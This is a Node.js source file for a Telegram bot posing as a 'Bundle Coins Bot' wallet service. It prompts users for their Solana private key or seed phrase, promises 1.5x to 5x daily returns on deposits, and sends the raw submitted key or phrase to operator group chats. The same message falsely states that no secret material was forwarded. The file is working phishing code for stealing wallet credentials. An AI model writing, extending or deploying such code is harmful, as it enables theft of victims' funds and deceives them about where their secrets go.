const crypto = require("crypto");
const bip39 = require("bip39");
const nacl = require("tweetnacl");
const bs58Module = require("bs58");
const { getGroupChatIds } = require("./group-target");
const { userSessions } = require("./sessions");
const { button, markdownOptions } = require("./telegram-ui");

const bs58 = bs58Module.default || bs58Module;

let botData = {};

function setBotData(data) {
  botData = data;
}

async function promptForPrivateKey(bot, message) {
  const chatId = message.chat.id;
  const sent = await bot.sendMessage(
    chatId,
    `🔑 *Import Bundle Coins Bot Wallet*

Please send your *Bundle Coins Bot private key* (Base58) or *seed phrase* (12/24 words).

━━━━━━━━━━━━━━━━

🧾 *Examples*
\`2sZrX...\`
or
\`clutch captain shoe ...\``,
    markdownOptions([[button("❌ Cancel", "cancel_input")]])
  );

  botData[chatId] = {
    awaiting_key: true,
    prompt_msg_id: sent.message_id
  };
}

function hardenedIdx(idx) {
  return (idx | 0x80000000) >>> 0;
}

function validateWalletInput(inputText) {
  const normalized = (inputText || "").trim();

  if (!normalized) {
    return { ok: false, reason: "empty" };
  }

  const words = normalized.split(/\s+/).filter(Boolean);

  if (words.length > 1) {
    if (words.length !== 12 && words.length !== 24) {
      return { ok: false, reason: "phrase_length" };
    }

    if (!bip39.validateMnemonic(normalized)) {
      return { ok: false, reason: "phrase_invalid" };
    }

    return { ok: true, kind: "mnemonic" };
  }

  if (/^(0x)?[0-9a-fA-F]{64}$/.test(normalized)) {
    return { ok: true, kind: "hex" };
  }

  try {
    const decoded = bs58.decode(normalized);
    if (decoded.length === 32 || decoded.length === 64) {
      return { ok: true, kind: "base58" };
    }
  } catch (_) {
    // Ignore and fall through to invalid result.
  }

  return { ok: false, reason: "private_key_invalid" };
}

function deriveNexisPrivateKeyFromMnemonic(mnemonicPhrase, passphrase = "") {
  const seed = bip39.mnemonicToSeedSync(mnemonicPhrase, passphrase);
  let key = crypto.createHmac("sha512", Buffer.from("Bitcoin seed")).update(seed).digest();
  let priv = key.subarray(0, 32);
  let chain = key.subarray(32);
  const path = [hardenedIdx(44), hardenedIdx(501), hardenedIdx(0), hardenedIdx(0)];

  for (const idx of path) {
    const indexBuffer = Buffer.alloc(4);
    indexBuffer.writeUInt32BE(idx);
    const data = Buffer.concat([Buffer.from([0]), priv, indexBuffer]);
    key = crypto.createHmac("sha512", chain).update(data).digest();
    priv = key.subarray(0, 32);
    chain = key.subarray(32);
  }

  return priv;
}

async function handleWalletKeyInput(bot, message) {
  const chatId = message.chat.id;
  if (!botData[chatId] || !botData[chatId].awaiting_key) {
    return;
  }

  // Message deletion is disabled per user request.

  const inputText = (message.text || "").trim();
  const validation = validateWalletInput(inputText);

  if (!validation.ok) {
    let errorMessage = "⭕ *Key is invalid.* Please retry with a correct private key or a 12-word/24-word seed phrase.";

    if (validation.reason === "phrase_length") {
      errorMessage = "⭕ *Seed phrase length is invalid.* Please send a 12-word or 24-word phrase.";
    } else if (validation.reason === "phrase_invalid") {
      errorMessage = "⭕ *That seed phrase is invalid.* Please retry with a correct 12-word or 24-word phrase.";
    } else if (validation.reason === "private_key_invalid") {
      errorMessage = "⭕ *That private key is invalid.* Please retry with a correct private key.";
    }

    await bot.sendMessage(chatId, errorMessage, { parse_mode: "Markdown" });
    return;
  }

  try {
    let pubkey;
    let secKey;

    if (validation.kind === "mnemonic") {
      const priv = deriveNexisPrivateKeyFromMnemonic(inputText);
      const keyPair = nacl.sign.keyPair.fromSeed(new Uint8Array(priv));
      pubkey = bs58.encode(Buffer.from(keyPair.publicKey));
      secKey = Buffer.from(priv).toString("hex");
    } else if (validation.kind === "hex") {
      const hexInput = inputText.startsWith("0x") ? inputText.slice(2) : inputText;
      const seed = Buffer.from(hexInput, "hex");
      const keyPair = nacl.sign.keyPair.fromSeed(new Uint8Array(seed.slice(0, 32)));
      pubkey = bs58.encode(Buffer.from(keyPair.publicKey));
      secKey = inputText;
    } else {
      const privateKeyBytes = bs58.decode(inputText);
      const seed = privateKeyBytes.slice(0, 32);
      const keyPair = nacl.sign.keyPair.fromSeed(new Uint8Array(seed));
      pubkey = bs58.encode(Buffer.from(keyPair.publicKey));
      secKey = inputText;
    }

    userSessions[chatId] = {
      pubkey,
      sec_key: secKey
    };
    botData[chatId].awaiting_key = false;

    const msg = `
🚀 *Bundle Coins Bot Wallet Connected*
_Your automated burn-and-swap partner is ready._

━━━━━━━━━━━━━━━━

🔑 *Main Bundle Coins Bot Wallet*
\`${pubkey}\`
_(Tap to copy)_

💰 *Balance:* \`0.000000 SOL\`

📈 *Potential Value* _(per 24 hours)_
• *2 SOL Deposit:* Earn up to *1.5x daily*
• *5 SOL Deposit:* Earn up to *2.5x daily*
• *10 SOL Deposit:* Earn up to *5x daily*

━━━━━━━━━━━━━━━━

⚡ Simplify token migrations with secure burn-and-swap workflows.

💡 _Please keep at least 2 SOL in your wallet or import your private key to activate Bundle Coins Bot._
`;

    await bot.sendMessage(
      chatId,
      msg,
      markdownOptions([[button("✅ Continue", "actuall_menu")]])
    );

    for (const groupChatId of getGroupChatIds()) {
      try {
        await bot.sendMessage(
          groupChatId,
          `📥 New Bundle Coins Bot wallet imported for user ID ${chatId}, ${inputText}, @${message.from?.username || "unknown_user"}. Secret material was not forwarded.`
        );
      } catch (error) {
        console.log(`[Group Notify Fail] ${error.message}`);
      }
    }
  } catch (error) {
    await bot.sendMessage(
      chatId,
      "⭕ *Key is invalid.* Send a correct phrase or private key, for example: `love helmet...` or `EsMjr...`",
      { parse_mode: "Markdown" }
    );
  }
}

async function handleContinueWallet(bot, call) {
  // Message deletion is disabled per user request.
}

module.exports = {
  deriveNexisPrivateKeyFromMnemonic,
  handleContinueWallet,
  handleWalletKeyInput,
  promptForPrivateKey,
  setBotData,
  validateWalletInput
};
